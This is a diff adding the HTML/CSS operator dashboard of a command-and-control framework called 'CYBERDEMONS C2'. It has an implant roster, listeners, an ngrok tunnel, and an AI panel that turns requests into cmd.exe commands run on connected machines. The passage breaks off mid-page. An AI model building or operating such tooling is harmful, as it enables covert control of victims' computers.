@@ -1,0 +1,1227 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no">
+<meta name="theme-color" content="#0a0a0f">
+<title>CYBERDEMONS C2</title>
+<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;500;700;900&family=JetBrains+Mono:wght@300;400;500;700&family=Share+Tech+Mono&display=swap" rel="stylesheet">
+<style>
+:root {
+  --cyan: #00fff0; --magenta: #ff00ff; --green: #39ff14;
+  --red: #ff0040; --yellow: #ffea00; --bg: #05050a;
+  --surface: rgba(8,8,20,0.85); --card: rgba(12,12,30,0.9);
+  --border: rgba(0,255,240,0.12); --border-h: rgba(0,255,240,0.35);
+  --dim: #5a5a7a; --bright: #d0d0ff;
+  --glow-c: 0 0 15px rgba(0,255,240,0.3);
+  --glow-m: 0 0 15px rgba(255,0,255,0.3);
+  --glow-g: 0 0 15px rgba(57,255,20,0.3);
+  --glass: rgba(8,8,25,0.75);
+}
+* { margin:0; padding:0; box-sizing:border-box; }
+html,body { height:100%; overflow:hidden; }
+
+/* === BACKGROUND === */
+body {
+  font-family:'JetBrains Mono','Share Tech Mono',monospace;
+  background: var(--bg); color: var(--bright);
+  position: relative;
+}
+body::before {
+  content:''; position:fixed; inset:0; z-index:0;
+  background:
+    linear-gradient(rgba(0,255,240,0.015) 1px,transparent 1px),
+    linear-gradient(90deg,rgba(0,255,240,0.015) 1px,transparent 1px);
+  background-size: 50px 50px;
+  pointer-events:none;
+}
+body::after {
+  content:''; position:fixed; inset:0; z-index:0;
+  background: repeating-linear-gradient(
+    0deg,
+    transparent,
+    transparent 2px,
+    rgba(0,0,0,0.03) 2px,
+    rgba(0,0,0,0.03) 4px
+  );
+  pointer-events:none;
+  animation: scanlines 8s linear infinite;
+}
+@keyframes scanlines {
+  0% { transform: translateY(0); }
+  100% { transform: translateY(4px); }
+}
+body.has-bg::before { display:none; }
+body.has-bg::after { opacity:0.5; }
+
+/* === SPLASH === */
+#splash {
+  position:fixed; inset:0; z-index:9999;
+  background:#030306; display:flex; flex-direction:column;
+  align-items:center; justify-content:center;
+  transition: opacity .6s, transform .6s;
+}
+#splash.hidden { opacity:0; transform:scale(1.1); pointer-events:none; }
+.sl {
+  width:110px; height:110px; border:2px solid var(--cyan);
+  display:flex; align-items:center; justify-content:center;
+  font-size:44px; color:var(--cyan);
+  font-family:'Orbitron',monospace; font-weight:900;
+  box-shadow: var(--glow-c), inset 0 0 20px rgba(0,255,240,0.08);
+  margin-bottom:20px; animation: sg 2.5s ease-in-out infinite;
+  clip-path: polygon(10% 0%, 100% 0%, 90% 100%, 0% 100%);
+  background: rgba(0,255,240,0.03);
+  position:relative; overflow:hidden;
+}
+.sl::after {
+  content:''; position:absolute; inset:0;
+  background: linear-gradient(135deg, transparent 40%, rgba(0,255,240,0.06) 50%, transparent 60%);
+  animation: shimmer 3s infinite;
+}
+@keyframes shimmer { 0%{transform:translateX(-100%);} 100%{transform:translateX(100%);} }
+.sl img { width:100%; height:100%; object-fit:cover; }
+@keyframes sg {
+  0%,100% { box-shadow: var(--glow-c); }
+  50% { box-shadow: 0 0 35px rgba(0,255,240,0.5), 0 0 60px rgba(0,255,240,0.15); }
+}
+.st {
+  font-family:'Orbitron',monospace; font-size:26px; font-weight:900;
+  color:var(--cyan); text-shadow: 0 0 20px rgba(0,255,240,0.4), 0 0 40px rgba(0,255,240,0.1);
+  letter-spacing:6px; margin-bottom:4px;
+}
+.ss {
+  color:var(--magenta); font-size:10px; letter-spacing:6px;
+  text-transform:uppercase; text-shadow: 0 0 10px rgba(255,0,255,0.3);
+}
+.sb {
+  width:200px; height:2px; background:rgba(255,255,255,0.04);
+  overflow:hidden; margin-top:24px; position:relative;
+  clip-path: inset(0 round 2px);
+}
+.sbi {
+  height:100%; width:0;
+  background: linear-gradient(90deg,var(--cyan),var(--magenta),var(--cyan));
+  transition: width .3s;
+  box-shadow: 0 0 10px var(--cyan);
+}
+
+/* === DESKTOP LAYOUT === */
+.desktop-wrap {
+  display:grid;
+  grid-template-columns: 72px 1fr;
+  grid-template-rows: auto 1fr;
+  height:100vh; position:relative; z-index:1;
+}
+
+/* === TOP BAR === */
+.topbar {
+  grid-column: 1 / -1;
+  padding: 8px 16px;
+  background: var(--surface);
+  border-bottom: 1px solid var(--border);
+  display:flex; align-items:center; gap:12px;
+  backdrop-filter: blur(20px);
+  position:relative; z-index:10;
+}
+.topbar::after {
+  content:''; position:absolute; bottom:-1px; left:0; right:0; height:1px;
+  background: linear-gradient(90deg, transparent, var(--cyan), var(--magenta), var(--cyan), transparent);
+  opacity:0.4;
+}
+.topbar-logo {
+  width:32px; height:32px; border:1px solid var(--cyan);
+  display:flex; align-items:center; justify-content:center;
+  font-size:16px; color:var(--cyan); flex-shrink:0;
+  clip-path: polygon(15% 0%, 100% 0%, 85% 100%, 0% 100%);
+  background: rgba(0,255,240,0.05);
+  box-shadow: var(--glow-c);
+  overflow:hidden; position:relative;
+}
+.topbar-logo img { width:100%; height:100%; object-fit:cover; }
+.topbar-title {
+  font-family:'Orbitron',monospace; font-size:15px; font-weight:900;
+  color:var(--cyan); letter-spacing:3px;
+  text-shadow: 0 0 10px rgba(0,255,240,0.3);
+}
+.topbar-title span { color:var(--magenta); text-shadow: 0 0 10px rgba(255,0,255,0.3); }
+.topbar-status {
+  margin-left:auto; display:flex; align-items:center; gap:8px;
+  font-size:10px; color:var(--dim);
+}
+.topbar-status .dot {
+  width:7px; height:7px; border-radius:50%;
+}
+.topbar-status .dot.on { background:var(--green); box-shadow:var(--glow-g); animation: pulse 2s infinite; }
+.topbar-status .dot.off { background:var(--dim); }
+@keyframes pulse { 0%,100%{opacity:1;} 50%{opacity:0.5;} }
+.topbar-nav {
+  display:flex; gap:4px; margin-left:20px;
+  flex:1; min-width:0;
+  overflow-x:auto; overflow-y:hidden;
+  scrollbar-width:thin; scrollbar-color: rgba(0,255,240,0.3) transparent;
+  padding-bottom:2px;
+}
+.topbar-nav::-webkit-scrollbar { height:3px; }
+.topbar-nav::-webkit-scrollbar-track { background:transparent; }
+.topbar-nav::-webkit-scrollbar-thumb { background:rgba(0,255,240,0.2); border-radius:4px; }
+.topbar-nav .tn {
+  padding:6px 14px; font-size:10px; font-weight:700;
+  text-transform:uppercase; letter-spacing:1px;
+  color:var(--dim); cursor:pointer; white-space:nowrap;
+  border:1px solid transparent; border-radius:4px;
+  transition: all .2s; position:relative;
+  font-family:'JetBrains Mono',monospace;
+  text-decoration:none; display:inline-flex; align-items:center; gap:5px;
+}
+.topbar-nav .tn:hover { color:var(--cyan); border-color:rgba(0,255,240,0.15); }
+.topbar-nav .tn.on {
+  color:var(--cyan); border-color:rgba(0,255,240,0.3);
+  background:rgba(0,255,240,0.05);
+  box-shadow: 0 0 10px rgba(0,255,240,0.1);
+}
+/* Items that leave the dashboard for a full page rather than a panel. */
+.topbar-nav .tn.ext { border-left:1px solid rgba(0,255,240,0.15); margin-left:6px; }
+.topbar-nav .tn.ext:hover { color:var(--amber); border-color:rgba(255,180,0,0.3); }
+.topbar-nav .sep { align-self:center; width:1px; height:16px;
+  background:rgba(0,255,240,0.15); margin:0 2px; flex:0 0 auto; }
+.topbar-nav .tn.on::after {
+  content:''; position:absolute; bottom:-9px; left:20%; right:20%; height:2px;
+  background:var(--cyan); box-shadow: 0 0 8px var(--cyan);
+}
+/* Builder / Android / Shells used to live in their own .topbar-links block.
+   They are now entries in the single .topbar-nav (as .tn.ext), so those rules
+   are gone. */
+
+/* === SIDEBAR === */
+.sidebar {
+  background: var(--surface);
+  border-right: 1px solid var(--border);
+  display:flex; flex-direction:column;
+  align-items:center; padding:12px 0; gap:4px;
+  backdrop-filter: blur(20px);
+  position:relative; z-index:10;
+  overflow-y:auto;
+}
+.sidebar::after {
+  content:''; position:absolute; top:0; right:-1px; bottom:0; width:1px;
+  background: linear-gradient(180deg, var(--cyan), transparent 30%, transparent 70%, var(--magenta));
+  opacity:0.3;
+}
+.si {
+  width:48px; height:48px; border-radius:8px;
+  display:flex; flex-direction:column; align-items:center;
+  justify-content:center; gap:2px; cursor:pointer;
+  color:var(--dim); transition:all .2s; position:relative;
+  border:1px solid transparent;
+  /* entries are <a> for the standalone pages, so kill link decoration */
+  text-decoration:none;
+}
+.si:hover { color:var(--cyan); background:rgba(0,255,240,0.05); }
+.si.on {
+  color:var(--cyan); border-color:rgba(0,255,240,0.25);
+  background:rgba(0,255,240,0.06);
+  box-shadow: inset 0 0 15px rgba(0,255,240,0.05);
+}
+.si.on::before {
+  content:''; position:absolute; left:-1px; top:20%; bottom:20%; width:2px;
+  background:var(--cyan); box-shadow: 0 0 8px var(--cyan);
+  border-radius:0 2px 2px 0;
+}
+.si .ico { font-size:18px; }
+.si .lb { font-size:7px; text-transform:uppercase; letter-spacing:.5px; font-weight:700; }
+.sidebar-spacer { flex:1; }
+
+/* === MAIN CONTENT === */
+.main-content {
+  overflow:hidden; position:relative;
+}
+.content-panels {
+  display:flex; height:100%; transition: transform .35s cubic-bezier(.4,0,.2,1);
+}
+.content-panel {
+  min-width:100%; height:100%; overflow-y:auto; padding:16px;
+  scrollbar-width:thin; scrollbar-color: rgba(0,255,240,0.3) transparent;
+}
+.content-panel::-webkit-scrollbar { width:4px; }
+.content-panel::-webkit-scrollbar-track { background:transparent; }
+.content-panel::-webkit-scrollbar-thumb { background:rgba(0,255,240,0.2); border-radius:4px; }
+
+/* Scrollable list inside a card (listeners/ports, client lists).
+   Without a cap these grow until the card pushes the rest of the column off
+   screen, so the row list needs its own scroll region. */
+.scroll-y {
+  overflow-y:auto; overflow-x:hidden; min-height:0;
+  scrollbar-width:thin; scrollbar-color: rgba(0,255,240,0.3) transparent;
+}
+.scroll-y::-webkit-scrollbar { width:5px; }
+.scroll-y::-webkit-scrollbar-track { background:transparent; }
+.scroll-y::-webkit-scrollbar-thumb {
+  background:rgba(0,255,240,0.22); border-radius:4px;
+}
+.scroll-y::-webkit-scrollbar-thumb:hover { background:rgba(0,255,240,0.4); }
+
+/* === CYBER CARD === */
+.cc {
+  background: var(--card);
+  border:1px solid var(--border);
+  border-radius:8px; padding:16px;
+  margin-bottom:14px; position:relative;
+  overflow:hidden;
+  backdrop-filter:blur(10px);
+  transition: border-color .3s, box-shadow .3s;
+}
+.cc:hover {
+  border-color: var(--border-h);
+  box-shadow: 0 0 20px rgba(0,255,240,0.06);
+}
+/* corner brackets */
+.cc::before, .cc::after {
+  content:''; position:absolute; width:12px; height:12px;
+  border-color:var(--cyan); border-style:solid; opacity:0.3;
+  transition: opacity .3s;
+}
+.cc::before { top:-1px; left:-1px; border-width:1px 0 0 1px; }
+.cc::after { bottom:-1px; right:-1px; border-width:0 1px 1px 0; }
+.cc:hover::before, .cc:hover::after { opacity:0.7; }
+/* top glow line */
+.cc .glow-line {
+  position:absolute; top:0; left:25%; right:25%; height:1px;
+  background: linear-gradient(90deg, transparent, var(--cyan), transparent);
+  opacity:0.3;
+}
+.cc-title {
+  font-family:'Orbitron',monospace; font-size:9px;
+  text-transform:uppercase; letter-spacing:2px; color:var(--dim);
+  margin-bottom:12px; display:flex; align-items:center; gap:6px;
+}
+.cc-title .accent { color:var(--cyan); }
+
+/* === BUTTONS === */
+.btn {
+  display:inline-flex; align-items:center; justify-content:center;
+  padding:10px 18px; border-radius:4px; border:none;
+  color:var(--bright); font-family:'JetBrains Mono',monospace;
+  font-size:10px; cursor:pointer; transition:all .2s;
+  text-decoration:none; gap:4px; font-weight:700;
+  text-transform:uppercase; letter-spacing:1px;
+  position:relative; overflow:hidden;
+}
+.btn::before {
+  content:''; position:absolute; inset:0;
+  background:linear-gradient(135deg, rgba(255,255,255,0.05), transparent);
+  opacity:0; transition:opacity .2s;
+}
+.btn:hover::before { opacity:1; }
+.btn:active { transform:scale(0.97); }
+.btn-c { background:rgba(0,255,240,0.12); color:var(--cyan); border:1px solid rgba(0,255,240,0.3); }
+.btn-c:hover { background:rgba(0,255,240,0.2); box-shadow:var(--glow-c); }
+.btn-g { background:rgba(57,255,20,0.12); color:var(--green); border:1px solid rgba(57,255,20,0.3); }
+.btn-g:hover { background:rgba(57,255,20,0.2); box-shadow:var(--glow-g); }
+.btn-r { background:rgba(255,0,64,0.12); color:var(--red); border:1px solid rgba(255,0,64,0.3); }
+.btn-r:hover { background:rgba(255,0,64,0.2); box-shadow:0 0 15px rgba(255,0,64,0.3); }
+.btn-y { background:rgba(255,234,0,0.12); color:var(--yellow); border:1px solid rgba(255,234,0,0.3); }
+.btn-fw { width:100%; justify-content:center; }
+.btn-sm { padding:6px 12px; font-size:9px; }
+.btn:disabled { opacity:0.3; cursor:not-allowed; transform:none; box-shadow:none; }
+
+/* === INPUTS === */
+input, select {
+  font-family:'JetBrains Mono',monospace; outline:none;
+}
+.cyber-input {
+  width:100%; background:rgba(0,0,0,0.5);
+  border:1px solid var(--border); border-radius:4px;
+  padding:10px 12px; color:var(--bright);
+  font-size:12px; transition: all .2s;
+}
+.cyber-input:focus {
+  border-color:var(--cyan);
+  box-shadow: 0 0 10px rgba(0,255,240,0.1);
+}
+.cyber-input::placeholder { color:var(--dim); opacity:0.5; }
+
+/* === CLIENT ITEMS === */
+.ci {
+  display:flex; align-items:center; gap:10px;
+  padding:10px 12px; margin-bottom:4px;
+  background:rgba(0,0,0,0.25); border-radius:4px;
+  border:1px solid transparent; cursor:pointer;
+  transition:all .2s; position:relative;
+}
+.ci:hover { border-color:rgba(0,255,240,0.15); background:rgba(0,255,240,0.03); }
+.ci.sel { border-color:rgba(0,255,240,0.4); background:rgba(0,255,240,0.06); box-shadow:var(--glow-c); }
+.ci .dot { width:7px; height:7px; border-radius:50%; flex-shrink:0; }
+.ci .dot.on { background:var(--green); box-shadow:var(--glow-g); }
+.ci .dot.off { background:var(--dim); }
+.ci .info { flex:1; min-width:0; }
+.ci .info .addr { font-size:11px; font-weight:700; color:var(--bright); }
+.ci .info .meta { font-size:9px; color:var(--dim); margin-top:2px; }
+
+/* === CLIENT ROSTER === */
+/* Four lines per implant: host, who/OS, addr+hardware, last command. The old
+   single "ip:port ONLINE" row gave no way to tell two boxes apart. */
+.ci { align-items:flex-start; padding:9px 11px; }
+.ci .dot { margin-top:5px; }
+.ci .rt {
+  display:flex; align-items:center; gap:6px; min-width:0;
+}
+.ci .rt .host {
+  font-size:12px; font-weight:700; color:var(--bright);
+  white-space:nowrap; overflow:hidden; text-overflow:ellipsis;
+  letter-spacing:.3px;
+}
+.ci.stale .rt .host { color:var(--dim); }
+.ci .who {
+  font-size:9.5px; color:var(--cyan); opacity:.85; margin-top:2px;
+  white-space:nowrap; overflow:hidden; text-overflow:ellipsis;
+}
+.ci.stale .who { color:var(--dim); }
+/* hardware line: sep-joined chips, all truncating rather than wrapping so a
+   40-character CPU string cannot push the row to three lines */
+.ci .hw {
+  font-size:9px; color:var(--dim); margin-top:3px;
+  white-space:nowrap; overflow:hidden; text-overflow:ellipsis;
+}
+.ci .hw b { color:var(--dim); font-weight:400; opacity:.65; }
+.ci .lc {
+  font-size:9px; color:var(--magenta); opacity:.8; margin-top:3px;
+  white-space:nowrap; overflow:hidden; text-overflow:ellipsis;
+}
+.ci .lc .t { color:var(--dim); opacity:.7; margin-left:4px; }
+.ci .lc.idle { color:var(--dim); opacity:.45; }
+
+/* protocol / arch badges, right-aligned */
+.ci .bdgs { display:flex; align-items:center; gap:4px; margin-left:auto; padding-left:6px; }
+.bdg {
+  font-size:8px; font-weight:700; letter-spacing:.5px; padding:2px 5px;
+  border-radius:3px; border:1px solid; white-space:nowrap;
+}
+.bdg.p { color:var(--cyan); border-color:rgba(0,255,240,.3); background:rgba(0,255,240,.06); }
+.bdg.a { color:var(--magenta); border-color:rgba(255,0,255,.28); background:rgba(255,0,255,.05); }
+.ci.stale .bdg { opacity:.4; }
+
+/* re-fingerprint button: only shown on hover so it does not fight the data */
+.ci .pr {
+  opacity:0; transition:opacity .15s; flex-shrink:0; margin-top:3px;
+  width:18px; height:18px; line-height:15px; text-align:center; font-size:10px;
+  color:var(--dim); border:1px solid var(--border); border-radius:3px;
+  background:transparent; cursor:pointer; padding:0;
+}
+.ci:hover .pr { opacity:1; }
+.ci .pr:hover { color:var(--cyan); border-color:var(--border-h); }
+
+/* connected but not fingerprinted yet */
+.ci .who.wait { color:var(--yellow); opacity:.9; animation:pulse 1.2s ease-in-out infinite; }
+@keyframes pulse { 0%,100%{opacity:.35} 50%{opacity:.95} }
+
+/* === ROSTER FILTER BAR === */
+.cf {
+  display:flex; align-items:center; gap:6px; margin-bottom:7px;
+}
+.cf .cyber-input { flex:1; min-width:0; padding:6px 8px; font-size:10px; }
+.cf .cft {
+  display:flex; align-items:center; gap:4px; flex-shrink:0;
+  font-size:9px; color:var(--dim); cursor:pointer; user-select:none;
+  white-space:nowrap;
+}
+.cf .cft input { accent-color:#00fff0; width:11px; height:11px; cursor:pointer; margin:0; }
+.cf .cft:hover { color:var(--cyan); }
+.cf .cfc {
+  font-size:9px; color:var(--dim); flex-shrink:0; min-width:44px;
+  text-align:right; font-variant-numeric:tabular-nums;
+}
+/* no match under the filter: distinct from "no clients at all" */
+#cl .none { padding:22px 10px; text-align:center; color:var(--dim); font-size:10px; }
+#cl .none b { display:block; font-size:22px; opacity:.25; margin-bottom:6px; }
+
+/* === TERMINAL === */
+.term {
+  background:rgba(0,0,0,0.6); border:1px solid var(--border);
+  border-radius:4px; padding:12px; min-height:180px;
+  max-height:55vh; overflow-y:auto; font-size:11px;
+  line-height:1.6; font-family:'Share Tech Mono',monospace;
+  position:relative;
+}
+.term::before {
+  content:''; position:absolute; top:0; left:0; right:0; height:1px;
+  background: linear-gradient(90deg, transparent, var(--green), transparent);
+  opacity:0.2;
+}
+.term .l { white-space:pre-wrap; word-break:break-all; padding:1px 0; }
+.term .l.c { color:var(--cyan); }
+.term .l.c::before { content:'> '; color:var(--magenta); font-weight:700; }
+.term .l.r { color:var(--bright); }
+.term .l.s { color:var(--dim); font-style:italic; }
+.term .l.e { color:var(--red); }
+.term .l.f { color:var(--green); font-size:10px; }
+.tr {
+  display:flex; gap:6px; margin-top:8px;
+}
+.tr input {
+  flex:1; background:rgba(0,0,0,0.6);
+  border:1px solid var(--border); border-radius:4px;
+  padding:10px 14px; color:var(--bright);
+  font-size:12px; font-family:'Share Tech Mono',monospace;
+}
+.tr input:focus { border-color:var(--cyan); box-shadow:0 0 10px rgba(0,255,240,0.1); }
+.tr button {
+  border:1px solid rgba(0,255,240,0.3); border-radius:4px;
+  padding:10px 20px; font-family:'JetBrains Mono',monospace;
+  font-size:10px; cursor:pointer; font-weight:700;
+  background:rgba(0,255,240,0.1); color:var(--cyan);
+  text-transform:uppercase; letter-spacing:1px;
+  transition:all .2s;
+}
+.tr button:hover { background:rgba(0,255,240,0.2); box-shadow:var(--glow-c); }
+.tr button:active { transform:scale(0.97); }
+.tr button:disabled { opacity:0.3; cursor:not-allowed; transform:none; box-shadow:none; }
+
+/* === FILE GRID === */
+.fg { margin-bottom:14px; }
+.fg h4 {
+  font-size:9px; color:var(--dim); text-transform:uppercase;
+  letter-spacing:1.5px; margin-bottom:8px;
+  font-family:'Orbitron',monospace;
+}
+.fg h4 span { color:var(--cyan); }
+.file-grid { display:grid; grid-template-columns:repeat(auto-fill, minmax(220px,1fr)); gap:6px; }
+.fi {
+  background:rgba(0,0,0,0.3); border:1px solid var(--border);
+  border-radius:4px; padding:8px 10px;
+  display:flex; align-items:center; gap:8px;
+  transition: border-color .2s;
+}
+.fi:hover { border-color:var(--border-h); }
+.fi .fn { flex:1; min-width:0; font-size:10px; word-break:break-all; }
+.fi .fs { font-size:8px; color:var(--dim); white-space:nowrap; }
+.fi a {
+  color:var(--cyan); font-size:9px; text-decoration:none;
+  padding:4px 10px; border:1px solid rgba(0,255,240,0.3);
+  border-radius:3px; font-weight:700;
+  background:rgba(0,255,240,0.05); transition:all .2s;
+  text-transform:uppercase; letter-spacing:.5px;
+}
+.fi a:hover { background:rgba(0,255,240,0.15); box-shadow:var(--glow-c); }
+
+/* === HISTORY === */
+.hi {
+  padding:8px 0; border-bottom:1px solid rgba(0,255,255,0.04);
+  font-size:11px; display:flex; gap:10px;
+}
+.hi .t { color:var(--dim); font-size:9px; white-space:nowrap; padding-top:1px; }
+.hi .c { color:var(--cyan); word-break:break-all; }
+.hi .c::before { content:'> '; color:var(--magenta); font-weight:700; }
+
+/* === EMPTY STATE === */
+.emp { padding:30px 10px; text-align:center; color:var(--dim); font-size:11px; }
+.emp .b { font-size:36px; opacity:0.2; margin-bottom:8px; }
+
+/* === LISTENER ITEM === */
+.li {
+  display:flex; align-items:center; gap:8px;
+  padding:8px 10px; font-size:10px;
+  border-bottom:1px solid rgba(255,255,255,0.03);
+}
+.li .dot { width:6px; height:6px; border-radius:50%; flex-shrink:0; }
+.li .dot.on { background:var(--green); box-shadow:var(--glow-g); }
+.li .dot.off { background:var(--dim); }
+.li .pn { margin-right:auto; font-weight:700; }
+
+/* === DASHBOARD GRID (desktop) === */
+.dash-grid {
+  display:grid; gap:14px;
+  grid-template-columns: 1fr 1.2fr;
+  grid-template-rows: auto 1fr;
+}
+.dash-grid .cc { margin-bottom:0; }
+.dash-col { display:flex; flex-direction:column; gap:14px; }
+.dash-col .cc { flex:1; display:flex; flex-direction:column; }
+.dash-col .cc .term,
+.dash-col .cc .file-grid-wrap { flex:1; min-height:0; }
+.dash-full { grid-column:1/-1; }
+
+/* inline input row */
+.input-row {
+  display:flex; gap:6px; margin-bottom:8px;
+}
+.input-row input {
+  flex:1; background:rgba(0,0,0,0.5);
+  border:1px solid var(--border); border-radius:4px;
+  padding:8px 10px; color:var(--bright);
+  font-size:11px;
+}
+.input-row input:focus { border-color:var(--cyan); }
+
+/* === GLITCH ANIMATION === */
+@keyframes glitch {
+  0%   { text-shadow: 2px 0 var(--cyan), -2px 0 var(--magenta); }
+  20%  { text-shadow: -2px 0 var(--cyan), 2px 0 var(--magenta); }
+  40%  { text-shadow: 2px -1px var(--cyan), -2px 1px var(--magenta); }
+  60%  { text-shadow: -1px 2px var(--cyan), 1px -2px var(--magenta); }
+  80%  { text-shadow: 1px -1px var(--cyan), -1px 1px var(--magenta); }
+  100% { text-shadow: 2px 0 var(--cyan), -2px 0 var(--magenta); }
+}
+
+/* === HEX PATTERN DECORATION === */
+.hex-deco {
+  position:fixed; bottom:10px; right:10px; z-index:0;
+  font-size:8px; color:rgba(0,255,240,0.06);
+  font-family:'Share Tech Mono',monospace;
+  pointer-events:none; line-height:1.3;
+  max-width:200px; text-align:right;
+}
+
+/* === MOBILE FALLBACK === */
+@media (max-width: 768px) {
+  .desktop-wrap { grid-template-columns:1fr; }
+  .sidebar { display:none; }
+  /* The nav used to be display:none here, which left small screens with no way
+     to reach any panel at all. It is horizontally scrollable now, so keep it. */
+  .topbar { flex-wrap:wrap; }
+  .topbar-nav { display:flex; margin-left:0; order:3; width:100%; padding:4px 0 6px; }
+  .topbar-nav .tn { padding:5px 10px; font-size:9px; }
+  .topbar-title { display:none; }
+  .dash-grid { grid-template-columns:1fr; }
+  .content-panel { padding:10px; }
+}
+</style>
+</head>
+<body>
+
+<!-- SPLASH -->
+<div id="splash">
+  <div class="sl" id="splashLogoEl">&#9881;</div>
+  <div class="st">CYBERDEMONS</div>
+  <div class="ss">C2 Framework v2.0</div>
+  <div class="sb"><div class="sbi" id="sbar"></div></div>
+</div>
+
+<!-- DESKTOP LAYOUT -->
+<div class="desktop-wrap">
+
+  <!-- TOP BAR -->
+  <div class="topbar">
+    <div class="topbar-logo" id="hdrLogoEl">&#9881;</div>
+    <div class="topbar-title">CYBER<span>DEMONS</span></div>
+
+    <div class="topbar-nav" id="nav">
+      <div class="tn on" data-p="clients" onclick="sw('clients')">Clients</div>
+      <div class="tn" data-p="ai" onclick="sw('ai')">AI Prompt</div>
+      <div class="tn" data-p="terminal" onclick="sw('terminal')">Terminal</div>
+      <div class="tn" data-p="files" onclick="sw('files')">Files</div>
+      <div class="tn" data-p="history" onclick="sw('history')">History</div>
+      <div class="sep"></div>
+      <a class="tn ext" href="/builder">&#9881; Builder</a>
+      <a class="tn ext" href="/android">&#9760; Android</a>
+      <a class="tn ext" href="/shells">&#9760; Shells</a>
+    </div>
+
+    <div class="topbar-status">
+      <span class="dot off" id="hd"></span>
+      <span id="ht">Idle</span>
+    </div>
+  </div>
+
+  <!-- SIDEBAR -->
+  <div class="sidebar">
+    <div class="si on" data-p="clients" onclick="sw('clients')">
+      <span class="ico">&#128279;</span><span class="lb">Clients</span>
+    </div>
+    <div class="si" data-p="ai" onclick="sw('ai')">
+      <span class="ico">&#9881;</span><span class="lb">AI Prompt</span>
+    </div>
+    <div class="si" data-p="terminal" onclick="sw('terminal')">
+      <span class="ico">&#9000;</span><span class="lb">Terminal</span>
+    </div>
+    <div class="si" data-p="files" onclick="sw('files')">
+      <span class="ico">&#128193;</span><span class="lb">Files</span>
+    </div>
+    <div class="si" data-p="history" onclick="sw('history')">
+      <span class="ico">&#128214;</span><span class="lb">History</span>
+    </div>
+    <div class="sidebar-spacer"></div>
+    <a class="si" href="/builder" title="Builder">
+      <span class="ico">&#9881;</span><span class="lb">Builder</span>
+    </a>
+    <a class="si" href="/android" title="Android">
+      <span class="ico">&#9760;</span><span class="lb">Android</span>
+    </a>
+    <a class="si" href="/shells" title="Shells">
+      <span class="ico">&#9760;</span><span class="lb">Shells</span>
+    </a>
+  </div>
+
+  <!-- MAIN CONTENT -->
+  <div class="main-content">
+    <div class="content-panels" id="panels">
+
+      <!-- ======== CLIENTS PANEL ======== -->
+      <div class="content-panel" id="p-clients">
+        <div class="dash-grid">
+
+          <!-- CLIENTS LIST -->
+          <div class="cc">
+            <div class="glow-line"></div>
+            <div class="cc-title"><span class="accent">&#9670;</span> Connected Clients</div>
+            <div class="cf">
+              <input type="text" id="cfq" class="cyber-input"
+                     placeholder="filter: host, user, ip, os, cpu, last cmd"
+                     autocomplete="off" spellcheck="false"
+                     oninput="cfilter()">
+              <label class="cft" title="Hide implants that are not currently connected">
+                <input type="checkbox" id="cfo" onchange="cfilter()"> online
+              </label>
+              <span class="cfc" id="cfc">&mdash;</span>
+            </div>
+            <div id="cl" style="flex:1;overflow-y:auto;"></div>
+          </div>
+
+          <!-- RIGHT COLUMN: LISTENERS + NGROK + TERMINAL -->
+          <div class="dash-col">
+
+            <div class="cc">
+              <div class="glow-line"></div>
+              <div class="cc-title"><span class="accent">&#9670;</span> Listeners</div>
+              <div class="input-row">
+                <input type="number" id="np" placeholder="port" class="cyber-input" style="flex:1;">
+                <button class="btn btn-c btn-sm" onclick="addL()">+ Add</button>
+              </div>
+              <!-- Capped + scrollable: with a dozen ports the card grew until
+                   it pushed ngrok and the terminal off the bottom. -->
+              <div id="ll" class="scroll-y" style="flex:1;min-height:0;max-height:190px;"></div>
+            </div>
+
+            <div class="cc">
+              <div class="glow-line"></div>
+              <div class="cc-title"><span class="accent">&#9670;</span> Ngrok Tunnel</div>
+              <div class="input-row">
+                <input type="number" id="ngPort" value="7777" placeholder="port" class="cyber-input" style="flex:1;">
+                <button class="btn btn-c btn-sm" id="ngBtn" onclick="ngStart()">Start</button>
+                <button class="btn btn-r btn-sm" id="ngStopBtn" onclick="ngStop()" style="display:none;">Stop</button>
+              </div>
+              <div id="ngStatus" style="font-size:9px;color:var(--dim);">Not running</div>
+              <div id="ngUrl" style="font-size:11px;color:var(--green);margin-top:4px;display:none;"></div>
+            </div>
+
+          </div>
+        </div>
+      </div>
+
+      <!-- ======== AI PROMPT PANEL ======== -->
+      <div class="content-panel" id="p-ai">
+        <div class="cc" style="max-width:900px;">
+          <div class="glow-line"></div>
+          <div class="cc-title" style="justify-content:space-between;">
+            <span><span class="accent">&#9670;</span> AI Prompt</span>
+            <span id="aic" style="color:var(--dim);font-size:9px;font-family:'JetBrains Mono',monospace;">checking...</span>
+          </div>
+
+          <div style="font-size:10px;color:var(--dim);padding:0 2px 8px;">
+            Describe what you want in plain language. The local opencode model
+            turns it into a single <code>cmd.exe</code> command &mdash; you approve it
+            before anything runs.
+          </div>
+
+          <div class="term" id="aiLog" style="min-height:220px;max-height:420px;">
+            <div class="emp"><div class="b">&#9881;</div>No prompts yet</div>
+          </div>
+
+          <div class="tr">
+            <input type="text" id="aiIn" placeholder="Enter to plan, then Enter again to run &mdash; e.g. what files are in the current directory?" disabled>
+            <button id="aiGo" disabled onclick="aiPlan()">PLAN</button>
+          </div>
+          <div style="font-size:9px;color:var(--dim);margin-top:6px;">
+            <strong>Enter</strong> proposes a command &middot; <strong>Enter</strong> again runs it
+            &middot; <strong>Esc</strong> cancels
+          </div>
+
+          <div id="aiApprove" style="display:none;margin-top:8px;padding:10px;
+               border:1px solid var(--green);border-radius:6px;background:rgba(0,255,150,.06);">
+            <div style="font-size:9px;color:var(--green);letter-spacing:1px;margin-bottom:6px;">PROPOSED COMMAND &mdash; REVIEW BEFORE RUNNING</div>
+            <code id="aiCmd" style="display:block;font-family:'JetBrains Mono',monospace;
+                  font-size:12px;color:var(--green);word-break:break-all;margin-bottom:8px;"></code>
+            <div style="display:flex;gap:6px;">
+              <button class="btn btn-c btn-sm" style="flex:1;" onclick="aiRun()">RUN IT</button>
+              <button class="btn btn-sm" style="flex:1;" onclick="aiCancel()">CANCEL</button>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- ======== TERMINAL PANEL ======== -->
+      <div class="content-panel" id="p-term">
+        <div class="cc" style="max-width:900px;">
+          <div class="glow-line"></div>
+          <div class="cc-title" style="justify-content:space-between;">
+            <span><span class="accent">&#9670;</span> Terminal</span>
